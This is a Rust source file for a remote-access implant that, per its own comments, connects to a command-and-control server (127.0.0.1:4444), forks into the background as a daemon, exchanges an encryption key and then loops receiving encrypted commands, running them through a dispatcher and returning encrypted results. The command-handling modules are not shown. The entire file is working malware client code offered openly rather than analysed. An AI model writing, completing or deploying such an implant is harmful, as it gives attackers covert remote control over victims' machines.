use tokio::{net::TcpSocket, io::{AsyncWriteExt, AsyncReadExt},net::TcpStream};
use std::{io, net::{SocketAddr}, str::Bytes};
use chrono::{self, format::format};
extern crate crypto;

mod utils;
use utils::filter_action;
use sodiumoxide::crypto::secretbox;
mod comms;
use comms::{Payload, recv_data, intro};
mod encryption;
use encryption::{custom_decrypt, custom_encrypt};
use std::process::Command;
use fork::{daemon, Fork};
use tokio::runtime::Runtime;

async fn create_payload(stream: &mut TcpStream, key: &secretbox::Key) -> Payload{
    let buff: Vec<u8> = recv_data(stream).await;
    let text: Vec<u8> = custom_decrypt(key.clone(), buff);
    let payload_string: &str = std::str::from_utf8(&text).unwrap();
    let data: Payload = serde_json::from_str(payload_string).unwrap();
    data
}

async fn send_payload(stream: &mut TcpStream, key: &secretbox::Key, msg: &str){
    let (mut enc, nonce) = custom_encrypt(key.clone(), msg.to_string());
    stream.write_all(format!("{:0>16}", (enc.len() + nonce.as_ref().len()).to_string()).as_bytes()).await.unwrap();
    let mut test = nonce.as_ref().to_vec();
    test.append(&mut enc);
    //stream.write(&test).await.unwrap();
    stream.write_all(&test).await.unwrap();
}

async fn connect_c2(address: &str) -> io::Result<TcpStream>{
    let addr: SocketAddr = address.parse().unwrap();
    let socket :TcpSocket = TcpSocket::new_v4().unwrap();
    let stream: TcpStream = socket.connect(addr).await.unwrap();
    Ok(stream)
}

fn start() {
    //connect to c2
    
    if let Ok(Fork::Child) = daemon(true, false) {
    
        let rt = Runtime::new().unwrap();
    rt.block_on(async{
    
        let mut stream: TcpStream = connect_c2("127.0.0.1:4444").await.unwrap();
    //do intro msg to get our key we will use for encrypt/decrypt
    let key:secretbox::Key = intro(&mut stream).await.unwrap();
    loop {
        //We are processing the data and turning it into our payload struct`~
        let data: Payload = create_payload(&mut stream, &key).await;
        //Send the data to a filter function to figure out what do do with the command
        let msg: String = filter_action(&data.command, &data.data);
        //send the result
        send_payload(&mut stream, &key, &msg).await;
        
        }
        });
    }
}

fn main() -> io::Result<()> {
    
        start();
    
Ok(())
}


